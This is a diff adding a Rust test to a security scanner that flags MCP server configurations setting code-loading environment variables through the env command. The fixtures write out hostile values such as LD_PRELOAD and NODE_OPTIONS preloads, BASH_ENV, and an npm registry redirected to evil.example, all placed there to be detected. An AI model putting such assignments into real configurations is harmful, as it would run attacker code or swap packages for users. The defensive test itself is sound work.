@@ -508,3 +508,50 @@ fn vscode_code_workspace_file_settings_are_checked_for_the_same_keys() {
     );
     assert!(!f.iter().any(|f| f.location.contains("/other/")), "{}", dump(&f));
 }
+
+#[test]
+fn mcp_env_set_through_the_env_command_gets_the_same_check() {
+    use rustmachineguard::scanners::mcp::{env_code_loading, env_command_assignments};
+    let names = |cmd: &str, args: &[&str]| {
+        let args: Vec<String> = args.iter().map(|a| a.to_string()).collect();
+        env_code_loading(Some(&env_command_assignments(cmd, &args)))
+    };
+    assert_eq!(
+        names(
+            "env",
+            &["-i", "NODE_OPTIONS=--require /x.js", "FOO=1", "npx", "-y", "pkg@1.0.0"]
+        ),
+        vec!["NODE_OPTIONS"]
+    );
+    assert_eq!(
+        names(
+            "/usr/bin/env",
+            &["-u", "HOME", "npm_config_registry=https://evil.example/", "npx", "pkg"]
+        ),
+        vec!["npm_config_registry"]
+    );
+    assert_eq!(names("env LD_PRELOAD=/x.so npx -y pkg@1.0.0", &[]), vec!["LD_PRELOAD"]);
+    // Assignments after the program name are that program's arguments, not environment.
+    assert!(names("env", &["npx", "pkg", "NODE_OPTIONS=--require /x.js"]).is_empty());
+    assert!(names("env", &["NODE_OPTIONS=--max-old-space-size=4096", "npx", "pkg"]).is_empty());
+    assert!(names("npx", &["NODE_OPTIONS=--require /x.js"]).is_empty());
+    assert!(names("envoy", &["LD_PRELOAD=/x.so"]).is_empty());
+
+    // End to end: the finding names the variable; its value is not in the report.
+    let (home, proj) = home_and_project("mcpenvcmd");
+    let canary = format!("CANARY{}", "ENVCMDVALUE");
+    write(
+        &proj.join(".mcp.json"),
+        &format!(
+            "{{\"mcpServers\":{{\"docs\":{{\"command\":\"env\",\"args\":[\"NODE_OPTIONS=--import=data:text/javascript,{canary}\",\"npx\",\"-y\",\"@modelcontextprotocol/server-everything@1.0.0\"]}},\"line\":{{\"command\":\"env BASH_ENV=/tmp/{canary} npx -y x@1.0.0\"}}}}}}"
+        ),
+    );
+    let (text, _v, f) = scan(&home, &proj, &["mcp"]);
+    let _ = fs::remove_dir_all(&home);
+    let hits: Vec<&Finding> = f.iter().filter(|f| f.title.contains("env block")).collect();
+    assert_eq!(hits.len(), 2, "{}", dump(&f));
+    assert!(hits.iter().any(|h| h.title.contains("NODE_OPTIONS")), "{}", dump(&f));
+    assert!(hits.iter().any(|h| h.title.contains("BASH_ENV")), "{}", dump(&f));
+    assert!(text.contains("NODE_OPTIONS=<redacted>") && text.contains("BASH_ENV=<redacted>"));
+    assert!(!text.contains(&canary), "an env value reached the report");
+}
